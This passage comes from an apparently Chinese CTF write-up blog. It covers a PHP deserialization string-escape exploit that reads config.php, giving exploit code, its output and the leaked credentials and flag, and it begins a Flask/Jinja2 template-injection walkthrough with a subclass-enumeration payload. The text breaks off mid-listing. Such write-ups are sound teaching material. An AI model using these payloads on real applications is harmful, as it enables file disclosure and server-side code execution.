class="hljs-name">label</span>&gt;</span><br></code></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">//update.php<br>&lt;?<br>		$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];<br>		$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];<br>		$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];<br>		$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);<br><br>		$user-&gt;update_profile($username, serialize($profile));<br>//这里进行了一次反序列化，调用update_profile函数，在class.php里面有写出来<br>public function update_profile($username, $new_profile) &#123;<br>		$username = parent::filter($username);<br>		$new_profile = parent::filter($new_profile);<br><br>		$where = &quot;username = &#x27;$username&#x27;&quot;;<br>		return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where);<br>	&#125;<br>//filter函数：<br>public function filter($string) &#123;<br>		$escape = array(&#x27;\&#x27;&#x27;, &#x27;\\\\&#x27;);<br>		$escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;;<br>		$string = preg_replace($escape, &#x27;_&#x27;, $string);<br><br>		$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);<br>		$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;<br>		return preg_replace($safe, &#x27;hacker&#x27;, $string);<br>	&#125;<br>我们注意到会把$safe名单里面的函数全部替换成hacker，此时，只有where是五个字节，而其他的都是6个字节，可以利用此一个字节的差异构造链子来进行序列化使之达到我们想要的文件包含。<br>    <br>//profile.php<br>&lt;?<br>    <br>		$profile = unserialize($profile);<br>		$phone = $profile[&#x27;phone&#x27;];<br>		$email = $profile[&#x27;email&#x27;];<br>		$nickname = $profile[&#x27;nickname&#x27;];<br>		$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));<br>//两次对$profile进行了序列化与反序列化，可能存在利用<br><br>//我们想要的链子：			&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;<br>//这样的话，图片那边的文件链接就会连接到本地的config.php从而打开此文件，实现文件包含<br>//想要的链子长度：33个字节<br>//因为一个此preg_replace只能多出来一个字符，所以我们需要构造33个where来换取33个字节的溢出，实现我们的序列化正常修改成我们想要的数据<br><br>//利用代码<br>&lt;?php<br><br>function filter($string) &#123;<br>    $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);<br>    $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;<br>    return preg_replace($safe, &#x27;hacker&#x27;, $string);<br>&#125;<br>$profile[&#x27;phone&#x27;]=&#x27;12345678901&#x27;;<br>$profile[&#x27;email&#x27;]=&#x27;lionelkkk@qq.com&#x27;;<br>$profile[&#x27;nickname&#x27;]=&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;;<br>$profile[&#x27;photo&#x27;] =&#x27;ffgfgfgf&#x27;;<br><br><br>$a=serialize($profile);<br>echo $a.&quot;\n&quot;;<br><br>$b=filter($a);<br>echo $b.&quot;\n&quot;;<br><br>$b=unserialize($b);<br>var_dump($b);<br><br><br>//输出<br>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:16:&quot;lionelkkk@qq.com&quot;;s:8:&quot;nickname&quot;;s:198:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:8:&quot;ffgfgfgf&quot;;&#125;<br>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:16:&quot;lionelkkk@qq.com&quot;;s:8:&quot;nickname&quot;;s:198:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:8:&quot;ffgfgfgf&quot;;&#125;<br>array(4) &#123;<br>  [&quot;phone&quot;]=&gt;<br>  string(11) &quot;12345678901&quot;<br>  [&quot;email&quot;]=&gt;<br>  string(16) &quot;lionelkkk@qq.com&quot;<br>  [&quot;nickname&quot;]=&gt;<br>  string(198) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;<br>  [&quot;photo&quot;]=&gt;<br>  string(10) &quot;config.php&quot;<br>&#125;<br>//但是很快发现对变量$nickname有一个长度限制，所以我们抓包的时候将变量nickname[]改成此数组的形式可以绕开长度的限制。<br>if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)<br>			die(&#x27;Invalid nickname&#x27;);<br>//因此，我们的利用链也需要同步进行更新<br><br>//分析一个数组的序列化<br>s:3:&quot;arr&quot;;a:2:&#123;s:1:&quot;w&quot;;s:5:&quot;wwwww&quot;;s:1:&quot;k&quot;;s:5:&quot;kkkkk&quot;;&#125;<br>//注意到是有  &#125;  的,所以我们构造链子的时候只需要在;后面加一个  &#125;  就行,因为链子多了一个字符，所以我们的where同理也需要再增加一个,再次发包update.php页面，然后查看profile.php页面查看源代码就可以看到图片src被替换成了config.php文件的base64内容,转一下base64解码就可以看到flag<br>    &quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;<br>    <br>PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFnezZlZmNhYmQ1LWQzYjctNGM4Zi04NGNmLWQ1NWVmYmJiYzEzOH0nOwo/Pgo=<br><br>&lt;?php<br>$config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;;<br>$config[&#x27;username&#x27;] = &#x27;root&#x27;;<br>$config[&#x27;password&#x27;] = &#x27;qwertyuiop&#x27;;<br>$config[&#x27;database&#x27;] = &#x27;challenges&#x27;;<br>$flag = &#x27;flag&#123;6efcabd5-d3b7-4c8f-84cf-d55efbbbc138&#125;&#x27;;<br>?&gt;<br><br></code></pre></td></tr></table></figure>



<h1 id="2-XCTF—-WP"><a href="#2-XCTF—-WP" class="headerlink" title="2.XCTF—-WP"></a>2.XCTF—-WP</h1><h2 id="1-Web-python-template-injection"><a href="#1-Web-python-template-injection" class="headerlink" title="1.Web_python_template_injection"></a>1.Web_python_template_injection</h2><p>D:\blog\pict\webflask1.png</p>
<p>D:\blog\pict\webflask2.png</p>
<p>如上可以看出是模板注入，在此处大括号中执行代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">__class__  <span class="hljs-comment">#返回类型所属的对象</span><br>__mro__    <span class="hljs-comment">#返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br>__base__   <span class="hljs-comment">#返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的</span><br><br>__subclasses__   <span class="hljs-comment">#每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br>__init__  <span class="hljs-comment">#类的初始化方法</span><br>__globals__  <span class="hljs-comment">#对包含函数全局变量的字典的引用</span><br><br></code></pre></td></tr></table></figure>

<p><strong>寻找可用引用</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>D:\blog\pict\webflask3.png</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">warnings</span>.<span class="hljs-title">WarningMessage</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">warnings</span>.<span class="hljs-title">catch_warnings</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_weakrefset</span>.<span class="hljs-title">_IterationGuard</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_weakrefset</span>.<span class="hljs-title">WeakSet</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_abcoll</span>.<span class="hljs-title">Hashable</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">classmethod</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_abcoll</span>.<span class="hljs-title">Iterable</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_abcoll</span>.<span class="hljs-title">Sized</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_abcoll</span>.<span class="hljs-title">Container</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_abcoll</span>.<span class="hljs-title">Callable</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">dict_keys</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">dict_items</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">dict_values</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">site</span>.<span class="hljs-title">_Printer</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">site</span>.<span class="hljs-title">_Helper</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_sre</span>.<span class="hljs-title">SRE_Pattern</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_sre</span>.<span class="hljs-title">SRE_Match</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_sre</span>.<span class="hljs-title">SRE_Scanner</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">site</span>.<span class="hljs-title">Quitter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">codecs</span>.<span class="hljs-title">IncrementalEncoder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">codecs</span>.<span class="hljs-title">IncrementalDecoder</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">functools</span>.<span class="hljs-title">partial</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">operator</span>.<span class="hljs-title">itemgetter</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">operator</span>.<span class="hljs-title">attrgetter</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">operator</span>.<span class="hljs-title">methodcaller</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">collections</span>.<span class="hljs-title">deque</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">deque_iterator</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">deque_reverse_iterator</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">combinations</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">combinations_with_replacement</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">cycle</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">dropwhile</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">takewhile</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">islice</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">starmap</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">imap</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">chain</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">compress</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">ifilter</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">ifilterfalse</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">count</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">izip</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">izip_longest</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">permutations</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">product</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">repeat</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">groupby</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">tee_dataobject</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">tee</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">_grouper</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_thread</span>.<span class="hljs-title">_localdummy</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">thread</span>.<span class="hljs-title">_local</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">thread</span>.<span class="hljs-title">lock</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">Struct</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_json</span>.<span class="hljs-title">Scanner</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_json</span>.<span class="hljs-title">Encoder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">json</span>.<span class="hljs-title">decoder</span>.<span class="hljs-title">JSONDecoder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">json</span>.<span class="hljs-title">encoder</span>.<span class="hljs-title">JSONEncoder</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">time</span>.<span class="hljs-title">struct_time</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">threading</span>.<span class="hljs-title">_Verbose</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">cPickle</span>.<span class="hljs-title">Unpickler</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">cPickle</span>.<span class="hljs-title">Pickler</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">cStringIO</span>.<span class="hljs-title">StringO</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">cStringIO</span>.<span class="hljs-title">StringI</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">string</span>.<span class="hljs-title">Template</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">string</span>.<span class="hljs-title">Formatter</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ssl</span>.<span class="hljs-title">_SSLContext</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ssl</span>.<span class="hljs-title">_SSLSocket</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">socket</span>.<span class="hljs-title">_closedsocket</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_socket</span>.<span class="hljs-title">socket</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">method_descriptor</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">socket</span>.<span class="hljs-title">_socketobject</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">socket</span>.<span class="hljs-title">_fileobject</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">urlparse</span>.<span class="hljs-title">ResultMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">contextlib</span>.<span class="hljs-title">GeneratorContextManager</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">contextlib</span>.<span class="hljs-title">closing</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">MissingType</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">LRUCache</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">Cycler</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">Joiner</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">Namespace</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">markupsafe</span>.<span class="hljs-title">_MarkupEscapeHelper</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">nodes</span>.<span class="hljs-title">EvalContext</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_hashlib</span>.<span class="hljs-title">HASH</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">nodes</span>.<span class="hljs-title">Node</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_random</span>.<span class="hljs-title">Random</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">TemplateReference</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">environment</span>.<span class="hljs-title">Environment</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">Context</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">BlockReference</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">LoopContextBase</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">LoopContextIterator</span>&#x27;&gt;, &lt;<span 